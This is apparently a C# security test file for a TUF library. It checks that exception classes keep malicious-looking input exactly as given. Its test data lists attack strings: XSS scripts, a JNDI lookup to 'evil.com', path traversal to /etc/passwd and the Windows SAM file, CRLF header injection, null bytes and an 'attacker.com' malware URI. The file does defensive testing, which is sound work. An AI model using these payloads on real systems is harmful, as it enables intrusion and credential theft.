using System.Text;
using TUF.Exceptions;
using TUF.Models;

namespace TUF.Tests;

/// <summary>
/// Security hardening tests for malicious input validation.
/// Focuses on practical attack vectors and edge cases that could be exploited
/// to compromise TUF security guarantees in real-world scenarios.
/// </summary>
/// <remarks>
/// This test suite addresses parity gaps identified in issue #47 by testing:
/// 1. Exception handling for malformed metadata structures
/// 2. Boundary condition testing for numeric fields
/// 3. String injection and manipulation attacks
/// 4. Resource exhaustion through extreme values
/// 5. Unicode normalization and encoding attacks
/// 6. Security-critical validation edge cases
/// 
/// Based on security practices from Python, Go, and Rust TUF implementations.
/// All tests focus on the public API level that applications would actually use.
/// </remarks>
public class MaliciousInputSecurityTests
{
    #region Exception Security Tests

    [Test]
    public async Task MetadataDeserializationException_WithMaliciousInput_HandlesSecurely()
    {
        // Arrange: Test malicious content in exception properties
        var maliciousInputs = new[]
        {
            "<script>alert('xss')</script>",
            "javascript:eval()",
            "${jndi:ldap://evil.com/payload}",
            "\0\r\n\x1f",
            new string('A', 1_000_000) // Very long string
        };

        foreach (var maliciousInput in maliciousInputs)
        {
            // Act: Create exception with malicious content
            var exception = new MetadataDeserializationException(
                "Test message", 
                maliciousInput, 
                maliciousInput);

            // Assert: Exception properties should preserve input exactly without interpretation
            await Assert.That(exception.MetadataType).IsEqualTo(maliciousInput);
            await Assert.That(exception.RawMetadata).IsEqualTo(maliciousInput);
            await Assert.That(exception.Message).IsEqualTo("Test message");
            
            // Verify no code execution or interpretation occurred
            await Assert.That(exception.MetadataType).IsNotNull();
            await Assert.That(exception.RawMetadata).IsNotNull();
        }
    }

    [Test]
    public async Task SignatureVerificationException_WithMaliciousKeyId_HandlesSecurely()
    {
        // Arrange: Test malicious key IDs
        var maliciousKeyIds = new[]
        {
            "../../../etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "key\x00admin",
            "key\r\nadmin",
            "key\\0admin",
            new string('K', 10000) // Extremely long key ID
        };

        foreach (var maliciousKeyId in maliciousKeyIds)
        {
            // Act: Create exception with malicious key ID
            var exception = new SignatureVerificationException(
                "Signature verification failed", 
                maliciousKeyId, 
                "targets");

            // Assert: Key ID should be preserved exactly
            await Assert.That(exception.KeyId).IsEqualTo(maliciousKeyId);
            await Assert.That(exception.MetadataType).IsEqualTo("targets");
            
            // Verify no path traversal or code execution
            await Assert.That(exception.KeyId).IsNotNull();
        }
    }

    [Test]
    public async Task TargetIntegrityException_WithMaliciousHashes_HandlesSecurely()
    {
        // Arrange: Test malicious hash values
        var maliciousHashes = new[]
        {
            "sha256-../../../secrets.txt",
            "md5-\x00\x01\x02\x03\x04\x05",
            "sha1-" + new string('F', 100000), // Extremely long hash
            "blake2b-${process.exit(1)}",
            "sha256-\r\nSet-Cookie: admin=true"
        };

        foreach (var maliciousHash in maliciousHashes)
        {
            // Act: Create exception with malicious hashes
            var exception = new TargetIntegrityException(
                "Hash mismatch",
                "/safe/target/path",
                maliciousHash,
                "sha256-actual");

            // Assert: Hash values should be preserved without interpretation
            await Assert.That(exception.ExpectedHash).IsEqualTo(maliciousHash);
            await Assert.That(exception.ActualHash).IsEqualTo("sha256-actual");
            await Assert.That(exception.TargetPath).IsEqualTo("/safe/target/path");
        }
    }

    #endregion

    #region Version Number Security Tests

    [Test]
    public async Task InsufficientSignaturesException_WithExtremeNumbers_HandlesCorrectly()
    {
        // Arrange: Test extreme signature counts
        var extremeCases = new[]
        {
            (Required: int.MaxValue, Valid: 0),
            (Required: 0, Valid: 0),
            (Required: -1, Valid: 5),
            (Required: 1000000, Valid: -1),
            (Required: int.MinValue, Valid: int.MaxValue)
        };

        foreach (var (required, valid) in extremeCases)
        {
            // Act: Create exception with extreme values
            var exception = new InsufficientSignaturesException(required, valid, "root");

            // Assert: Values should be preserved exactly
            await Assert.That(exception.RequiredSignatures).IsEqualTo(required);
            await Assert.That(exception.ValidSignatures).IsEqualTo(valid);
            await Assert.That(exception.RoleName).IsEqualTo("root");
            
            // Message should be generated safely even with extreme values
            await Assert.That(exception.Message).IsNotNull();
            await Assert.That(exception.Message).IsNotEmpty();
        }
    }

    [Test]
    public async Task RollbackAttackException_WithExtremeVersions_HandlesCorrectly()
    {
        // Arrange: Test extreme version numbers
        var extremeVersions = new[]
        {
            (Expected: int.MaxValue, Actual: int.MinValue),
            (Expected: 0, Actual: -1),
            (Expected: -1000000, Actual: 1000000),
            (Expected: 1, Actual: 0)
        };

        foreach (var (expected, actual) in extremeVersions)
        {
            // Act: Create exception with extreme versions
            var exception = new RollbackAttackException("timestamp", expected, actual);

            // Assert: Version numbers should be handled correctly
            await Assert.That(exception.ExpectedVersion).IsEqualTo(expected);
            await Assert.That(exception.ActualVersion).IsEqualTo(actual);
            await Assert.That(exception.MetadataType).IsEqualTo("timestamp");
            
            // Message generation should not overflow or crash
            await Assert.That(exception.Message).IsNotNull();
            await Assert.That(exception.Message).Contains("timestamp");
        }
    }

    #endregion

    #region File Size Security Tests

    [Test]
    public async Task FileSizeException_WithExtremeSizes_HandlesCorrectly()
    {
        // Arrange: Test extreme file sizes
        var extremeSizes = new[]
        {
            (Actual: long.MaxValue, MaxAllowed: 0L),
            (Actual: 0L, MaxAllowed: long.MaxValue),
            (Actual: -1L, MaxAllowed: 1000L),
            (Actual: 1000L, MaxAllowed: -1L),
            (Actual: long.MinValue, MaxAllowed: long.MaxValue)
        };

        foreach (var (actual, maxAllowed) in extremeSizes)
        {
            // Act: Create exception with extreme file sizes
            var exception = new FileSizeException("/test/file.bin", actual, maxAllowed);

            // Assert: File sizes should be preserved correctly
            await Assert.That(exception.ActualSize).IsEqualTo(actual);
            await Assert.That(exception.MaxAllowedSize).IsEqualTo(maxAllowed);
            await Assert.That(exception.FilePath).IsEqualTo("/test/file.bin");
            
            // Message generation should handle extreme values safely
            await Assert.That(exception.Message).IsNotNull();
            await Assert.That(exception.Message).Contains("/test/file.bin");
        }
    }

    #endregion

    #region String Field Security Tests

    [Test]
    public async Task TargetNotFoundException_WithMaliciousPath_HandlesSecurely()
    {
        // Arrange: Test malicious file paths
        var maliciousPaths = new[]
        {
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/dev/null\x00/etc/shadow",
            "C:\\$MFT\x00.txt",
            "aux.txt", // Windows reserved name
            "prn", // Windows reserved name
            "file\r\nwith\nnewlines",
            new string('/', 10000), // Extremely deep path
            "file\x00.exe" // Null byte injection
        };

        foreach (var maliciousPath in maliciousPaths)
        {
            // Act: Create exception with malicious path
            var exception = new TargetNotFoundException("Target not found", maliciousPath);

            // Assert: Path should be preserved exactly without sanitization
            await Assert.That(exception.TargetPath).IsEqualTo(maliciousPath);
            await Assert.That(exception.Message).IsEqualTo("Target not found");
            
            // Verify no path traversal occurs in the exception itself
            await Assert.That(exception.TargetPath).IsNotNull();
        }
    }

    [Test]
    public async Task DelegationException_WithMaliciousRoleName_HandlesSecurely()
    {
        // Arrange: Test malicious role names
        var maliciousRoleNames = new[]
        {
            "admin\x00user",
            "role\r\nsuperuser",
            "targets/../../../root",
            "role${env:ADMIN}",
            "<script>alert('xss')</script>",
            new string('R', 50000) // Extremely long role name
        };

        foreach (var maliciousRoleName in maliciousRoleNames)
        {
            // Act: Create exception with malicious role name
            var exception = new DelegationException("Delegation failed", maliciousRoleName, 5);

            // Assert: Role name should be preserved without interpretation
            await Assert.That(exception.RoleName).IsEqualTo(maliciousRoleName);
            await Assert.That(exception.DelegationDepth).IsEqualTo(5);
            
            // Verify no code execution or privilege escalation
            await Assert.That(exception.RoleName).IsNotNull();
        }
    }

    #endregion

    #region Unicode Security Tests

    [Test]
    public async Task UnicodeHomoglyphAttacks_InExceptionMessages_HandleCorrectly()
    {
        // Arrange: Test Unicode homoglyph attacks
        var homoglyphTests = new[]
        {
            ("root", "rооt"), // Latin vs Cyrillic 'o'
            ("admin", "аdmin"), // Latin vs Cyrillic 'a'
            ("targets", "tаrgets"), // Mixed Latin/Cyrillic
            ("file.exe", "file.еxe") // Cyrillic 'е' instead of Latin 'e'
        };

        foreach (var (legitimate, malicious) in homoglyphTests)
        {
            // Act: Create exceptions with homoglyph role names
            var exception = new DelegationException("Test", malicious, 1);

            // Assert: Homoglyph should be preserved exactly (no normalization)
            await Assert.That(exception.RoleName).IsEqualTo(malicious);
            await Assert.That(exception.RoleName).IsNotEqualTo(legitimate);
            
            // Verify byte-level differences are preserved
            var legitimateBytes = Encoding.UTF8.GetBytes(legitimate);
            var maliciousBytes = Encoding.UTF8.GetBytes(malicious);
            await Assert.That(legitimateBytes).IsNotEqualTo(maliciousBytes);
        }
    }

    [Test]
    public async Task UnicodeControlCharacters_InExceptionFields_PreservedCorrectly()
    {
        // Arrange: Test Unicode control characters
        var controlCharacterTests = new[]
        {
            "file\x00.txt", // NULL
            "file\x08.txt", // Backspace
            "file\x0A.txt", // Line Feed
            "file\x0D.txt", // Carriage Return
            "file\x1B[31m.txt", // ANSI escape sequence
            "file\x7F.txt", // DEL
            "file\u200B.txt", // Zero-width space
            "file\u200E.txt", // Left-to-right mark
            "file\uFEFF.txt" // Byte order mark
        };

        foreach (var testString in controlCharacterTests)
        {
            // Act: Create exception with control characters
            var exception = new TargetNotFoundException("Not found", testString);

            // Assert: Control characters should be preserved exactly
            await Assert.That(exception.TargetPath).IsEqualTo(testString);
            
            // Verify the string contains the expected control character
            await Assert.That(exception.TargetPath).IsNotNull();
            await Assert.That(exception.TargetPath).IsNotEmpty();
        }
    }

    #endregion

    #region Network Exception Security Tests

    [Test]
    public async Task RepositoryNetworkException_WithMaliciousUri_HandlesSecurely()
    {
        // Arrange: Test malicious URIs
        var maliciousUris = new[]
        {
            "file:///etc/passwd",
            "ftp://attacker.com/malware.exe",
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
            "http://localhost:22/../../etc/shadow",
            "https://evil.com/normal.json#../../secrets"
        };

        foreach (var maliciousUriString in maliciousUris)
        {
            try
            {
                var maliciousUri = new Uri(maliciousUriString);
                
                // Act: Create exception with malicious URI
                var exception = new RepositoryNetworkException(
                    "Network error", 
                    maliciousUri, 
                    System.Net.HttpStatusCode.NotFound);

                // Assert: URI should be preserved without interpretation
                await Assert.That(exception.RepositoryUri).IsEqualTo(maliciousUri);
                await Assert.That(exception.StatusCode).IsEqualTo(System.Net.HttpStatusCode.NotFound);
                
                // Verify no network access occurs during exception creation
                await Assert.That(exception.RepositoryUri).IsNotNull();
            }
            catch (UriFormatException)
            {
                // Some malicious URIs may be rejected by Uri constructor - that's acceptable
                continue;
            }
        }
    }

    #endregion

    #region Configuration Security Tests

    [Test]
    public async Task TufConfigurationException_WithMaliciousPropertyName_HandlesSecurely()
    {
        // Arrange: Test malicious configuration property names
        var maliciousPropertyNames = new[]
        {
            "__proto__",
            "constructor.prototype",
            "process.env.SECRET",
            "System.Environment.GetEnvironmentVariable",
            "../config.json",
            "property\x00injection",
            "property\r\nSecretProperty"
        };

        foreach (var maliciousProperty in maliciousPropertyNames)
        {
            // Act: Create exception with malicious property name
            var exception = new TufConfigurationException(
                "Invalid configuration", 
                maliciousProperty);

            // Assert: Property name should be preserved without interpretation
            await Assert.That(exception.ConfigurationProperty).IsEqualTo(maliciousProperty);
            await Assert.That(exception.Message).IsEqualTo("Invalid configuration");
            
            // Verify no property access or code execution occurs
            await Assert.That(exception.ConfigurationProperty).IsNotNull();
        }
    }

    #endregion

    #region Delegation Depth Security Tests

    [Test]
    public async Task MaxDelegationDepthExceededException_WithExtremeDepths_HandlesCorrectly()
    {
        // Arrange: Test extreme delegation depths
        var extremeDepths = new[]
        {
            (MaxDepth: int.MaxValue, CurrentDepth: int.MinValue),
            (MaxDepth: 0, CurrentDepth: 1),
            (MaxDepth: -1, CurrentDepth: 0),
            (MaxDepth: 1000000, CurrentDepth: 2000000),
            (MaxDepth: int.MinValue, CurrentDepth: int.MaxValue)
        };

        foreach (var (maxDepth, currentDepth) in extremeDepths)
        {
            // Act: Create exception with extreme depths
            var exception = new MaxDelegationDepthExceededException(maxDepth, currentDepth);

            // Assert: Depths should be preserved correctly
            await Assert.That(exception.MaxDepth).IsEqualTo(maxDepth);
            await Assert.That(exception.DelegationDepth).IsEqualTo(currentDepth);
            
            // Message generation should handle extreme values safely
            await Assert.That(exception.Message).IsNotNull();
            await Assert.That(exception.Message).Contains("Maximum delegation depth");
            
            // Should inherit from DelegationException
            await Assert.That(typeof(DelegationException).IsAssignableFrom(exception.GetType())).IsTrue();
        }
    }

    #endregion

    #region Exception Serialization Security Tests

    [Test]
    public async Task SecurityExceptions_DoNotLeakSensitiveInformation()
    {
        // Arrange: Create exceptions with potentially sensitive information
        var sensitiveExceptions = new TufException[]
        {
            new SignatureVerificationException("Signature failed", "secret-key-id-12345", "root"),
            new TargetIntegrityException("Hash mismatch", "/secret/internal/file.key", "sha256-secret", "sha256-actual"),
            new RepositoryNetworkException("Failed", new Uri("https://internal.company.com/secret-repo"), System.Net.HttpStatusCode.Forbidden),
            new TufConfigurationException("Invalid", "SecretApiKey")
        };

        foreach (var exception in sensitiveExceptions)
        {
            // Act: Get exception message and string representation
            var message = exception.Message;
            var stringRepresentation = exception.ToString();

            // Assert: Basic security checks
            await Assert.That(message).IsNotNull();
            await Assert.That(stringRepresentation).IsNotNull();
            
            // Verify exception maintains its type and basic structure
            await Assert.That(typeof(TufException).IsAssignableFrom(exception.GetType())).IsTrue();
            await Assert.That(exception.GetType().IsSubclassOf(typeof(TufException))).IsTrue();
        }
    }

    #endregion

    #region Memory Safety Tests

    [Test]
    public async Task ExceptionCreation_WithLargeStrings_DoesNotCauseExcessiveMemoryUsage()
    {
        // Arrange: Create very large strings to test memory handling
        var largeString = new string('X', 10_000_000); // 10MB string
        
        // Act: Create various exceptions with large strings
        var exceptions = new TufException[]
        {
            new MetadataDeserializationException("Test", "root", largeString),
            new SignatureVerificationException("Test", largeString, "targets"),
            new TargetNotFoundException("Test", largeString),
            new TargetIntegrityException("Test", largeString, "sha256-test", "sha256-actual"),
            new DelegationException("Test", largeString, 5),
            new TufConfigurationException("Test", largeString)
        };

        // Assert: All exceptions should be created successfully
        foreach (var exception in exceptions)
        {
            await Assert.That(exception).IsNotNull();
            await Assert.That(exception.Message).IsNotNull();
            
            // Basic functionality should work even with large strings
            await Assert.That(typeof(TufException).IsAssignableFrom(exception.GetType())).IsTrue();
        }
    }

    #endregion
}